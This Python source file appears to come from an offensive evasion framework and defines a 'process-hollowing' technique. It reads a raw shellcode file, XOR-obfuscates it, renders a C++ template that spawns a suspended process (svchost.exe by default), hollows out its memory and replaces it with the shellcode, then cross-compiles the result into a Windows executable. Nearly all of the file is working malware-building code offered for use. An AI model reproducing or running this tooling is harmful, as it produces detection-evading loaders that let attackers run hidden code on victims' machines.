import os
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.compiler import cross_compile_cpp
from utils.obfuscator import xor_encrypt
from utils.helpers import format_shellcode_to_hex, get_output_path
from config import TEMPLATE_DIRS

class ProcessHollowing(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="process-hollowing",
            description="Creates a legitimate process in a suspended state, carves out its memory, and replaces it with shellcode.",
            options=[
                {'name': '--payload', 'type': str, 'required': True, 'help': 'Path to the raw shellcode file.'},
                {'name': '--process', 'type': str, 'required': False, 'default': 'C:\\Windows\\System32\\svchost.exe', 'help': 'Full path of the target process to spawn and hollow.'},
                {'name': '--output', 'type': str, 'required': True, 'help': 'Name of the output executable file.'}
            ]
        )

    def generate(self, **kwargs):
        payload_path = kwargs['payload']
        target_process = kwargs['process']
        output_filename = kwargs['output']

        print(f"[*] Generating executable for Process Hollowing targeting '{target_process}'")

        # 1. Read shellcode
        try:
            with open(payload_path, 'rb') as f:
                shellcode = f.read()
        except FileNotFoundError:
            print(f"[!] Error: Payload file '{payload_path}' not found.")
            return
        except Exception as e:
            print(f"[!] Error reading payload file '{payload_path}': {e}")
            return

        # 2. Obfuscate shellcode (XOR is simple and effective for this)
        encrypted_shellcode, key = xor_encrypt(shellcode)
        hex_shellcode = format_shellcode_to_hex(encrypted_shellcode)
        print(f"[*] Payload obfuscated with XOR key: {key}")

        # 3. Render C++ template
        try:
            env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)
            template = env.get_template("process_hollowing.cpp")
            cpp_code = template.render(
                shellcode_hex=hex_shellcode,
                xor_key=key,
                target_process_str=target_process.replace('\\', '\\\\') # Escape backslashes for C++ string
            )
        except Exception as e:
            print(f"[!] Error rendering C++ template: {e}")
            return

        # 4. Compile the C++ code
        # Ensure /tmp directory exists or handle creation/alternative
        temp_dir = "/tmp"
        if not os.path.exists(temp_dir):
            try:
                os.makedirs(temp_dir)
            except OSError as e:
                print(f"[!] Error creating temporary directory {temp_dir}: {e}. Please create it manually or check permissions.")
                # Fallback to current directory if /tmp fails
                temp_dir = "." 
                print(f"[*] Using current directory for temporary files: {os.getcwd()}")


        temp_source_path = os.path.join(temp_dir, f"{output_filename}.cpp")
        
        try:
            with open(temp_source_path, 'w') as f:
                f.write(cpp_code)
        except Exception as e:
            print(f"[!] Error writing temporary C++ source file '{temp_source_path}': {e}")
            return
        
        output_path = get_output_path(output_filename)
        if not cross_compile_cpp(temp_source_path, output_path):
            print(f"[!] Failed to compile. Check compiler output above. Temporary source: {temp_source_path}")
            # Optionally, do not remove the temp source if compilation fails, for debugging
            # return 
        
        # 5. Cleanup
        try:
            if os.path.exists(temp_source_path):
                os.remove(temp_source_path)
        except Exception as e:
            print(f"[!] Warning: Failed to remove temporary source file '{temp_source_path}': {e}")

        if os.path.exists(output_path):
            print(f"[+] Process Hollowing executable generated: {output_path}")
        else:
            print(f"[!] Process Hollowing executable generation failed. Output file not found at {output_path}")
